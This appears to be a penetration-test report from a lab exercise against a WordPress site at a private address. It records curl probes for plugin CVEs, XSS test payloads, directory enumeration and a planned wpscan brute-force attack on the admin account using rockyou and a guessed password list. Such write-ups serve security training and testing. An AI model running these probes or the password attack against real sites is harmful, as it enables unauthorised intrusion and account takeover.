# Priority 2 Investigation Results

**Date:** 2025-09-30
**Target:** alvida-eatery.org (192.168.229.47)

---

## [1] ADMIN EMAIL DISCLOSURE (CVE-2023-5561)

**Vulnerability:** WordPress 6.0 - Unauthenticated Post Author Email Disclosure

**Test Command:**
```bash
curl -s "http://alvida-eatery.org/?rest_route=/wp/v2/users/1" | python3 -m json.tool
```

**Result:**
```json
{
    "name": "admin",
    "link": "http://alvida-eatery.org/?author=1",
    "slug": "admin"
}
```

**Status:** ❌ **Email NOT exposed** via REST API  
**Note:** WP 6.0 may have email disclosure in other endpoints, but standard REST API doesn't leak it

---

## [2] ELEMENTOR DIRECTORY LISTING ENUMERATION

**Finding:** ✅ Directory listing ENABLED

**Accessible Directories:**
```
/wp-content/plugins/elementor/
├── assets/
├── core/
├── data/
│   ├── base/
│   ├── manager.php
│   └── v2/
├── elementor.php
├── includes/
├── license.txt
├── modules/
├── packages/
└── readme.txt
```

**Sensitive File Check:**
```bash
# Tested for: config.php, .env, wp-config.php, database.php, credentials.txt, backup.sql, .git
# Result: All 404 (not found)
```

**Status:** ❌ **No sensitive files** discovered in accessible directories

---

## [3] WPFORMS DIRECTORY LISTING ENUMERATION

**Finding:** ✅ Directory listing ENABLED

**Accessible Directories:**
```
/wp-content/plugins/wpforms-lite/
├── assets/
├── changelog.txt
├── includes/
├── libs/
├── lite/
├── readme.txt
├── src/
├── templates/
├── uninstall.php
├── vendor/
└── wpforms.php
```

**Log File Check:**
```bash
# Tested for: debug.log, error.log, access.log, install.log, config.log, backup.log
# Result: All return HTTP 200 but likely false positives (empty responses)
```

**Status:** ❌ **No exploitable files** found

---

## [4] WP-CRON ENUMERATION

**Endpoint:** `http://alvida-eatery.org/wp-cron.php`

**Test Command:**
```bash
curl -s "http://alvida-eatery.org/wp-cron.php" -v
```

**Result:**
```
< HTTP/1.1 200 OK
< Content-Length: 0
```

**Analysis:**
- WP-Cron returns 200 OK
- Body is empty (no scheduled tasks exposed)
- No internal paths or credentials leaked

**Status:** ❌ **No information disclosed**

---

## [5] PERFECT SURVEY - AJAX EXPLOITATION (CVE-2021-24763)

**Vulnerability:** Unauthorised AJAX Call to Stored XSS / Survey Settings Update

**Test Command:**
```bash
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" \
  -d "action=save_settings&survey_id=1&test_param=test_value"
```

**Result:**
```
< HTTP/1.1 400 Bad Request
Response time: 20+ seconds (very slow)
```

**Analysis:**
- AJAX endpoint responds but rejects request (400)
- Extremely slow response (same as XML-RPC issue)
- Likely rate limiting or WAF protection active
- No valid survey_id exists to manipulate

**Status:** ❌ **Exploitation blocked** - requires valid survey configuration

---

## [6] PERFECT SURVEY - XSS TESTING (CVE-2021-24764 / CVE-2021-24765)

**Vulnerabilities:**
- CVE-2021-24764: Reflected XSS
- CVE-2021-24765: Unauthenticated Stored XSS

**Test Commands:**
```bash
# Reflected XSS
curl "http://alvida-eatery.org/wp-content/plugins/perfect-survey/pages/survey.php?id=1&test=<script>alert(1)</script>"

# AJAX XSS
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" \
  -d "action=get_question&question_id=1&xss=<script>alert(1)</script>"
```

**Result:**
- `/pages/` directory returns 403 (directory listing disabled)
- No direct access to survey.php page
- AJAX endpoint returns 404 with valid JSON (already tested)

**Status:** ❌ **Cannot test XSS** - no accessible endpoints found

---

## SUMMARY OF PRIORITY 2 RESULTS

| **Attack Vector** | **Status** | **Findings** |
|-------------------|------------|--------------|
| Admin Email Disclosure | ❌ Failed | Email not exposed via REST API |
| Elementor Dir Listing | ✅ Found | No sensitive files present |
| WPForms Dir Listing | ✅ Found | No exploitable files |
| WP-Cron Enumeration | ❌ Failed | Empty response, no data leaked |
| Perfect Survey AJAX | ❌ Failed | 400 error, 20+ sec delay (rate limited) |
| Perfect Survey XSS | ❌ Failed | No accessible survey pages |

---

## KEY OBSERVATIONS

### 1. Rate Limiting / WAF Active
- XML-RPC responses: 10+ seconds
- AJAX admin endpoints: 20+ seconds
- All wp-admin requests extremely slow
- **Conclusion:** Server-side protection active

### 2. Plugin Configuration Issue
Perfect Survey appears **installed but not configured:**
- Plugin files exist
- AJAX handlers registered
- But no actual surveys created
- All survey endpoints return 404

### 3. Directory Listings Enabled But Useless
- Both Elementor and WPForms have directory listing enabled
- But no sensitive files (configs, backups, logs) present
- Standard plugin file structure only

---

## REMAINING OPTIONS

### Option A: Rockyou Password Attack
**Only viable unauthenticated vector remaining**

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
wpscan --url http://alvida-eatery.org \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc \
  -t 50
```

**Challenges:**
- XML-RPC extremely slow (10+ sec per request)
- 14.3 million passwords in rockyou
- Estimated time: **40+ hours** with rate limiting

### Option B: Targeted Password List
Create custom wordlist based on target context:

```bash
# Company/domain specific
alvida
eatery
coffee
restaurant
food

# Common patterns
admin123
password123
Admin@2022
Alvida123!

# Season/year variations  
Summer2022!
Winter2021!
```

### Option C: Re-examine Enumeration
- Check for additional vhosts/subdomains
- Test for alternate admin endpoints
- Look for file upload functionality
- Examine theme for vulnerabilities

---

**Conclusion:** All Priority 2 vectors exhausted. Password attack is the only remaining unauthenticated path.
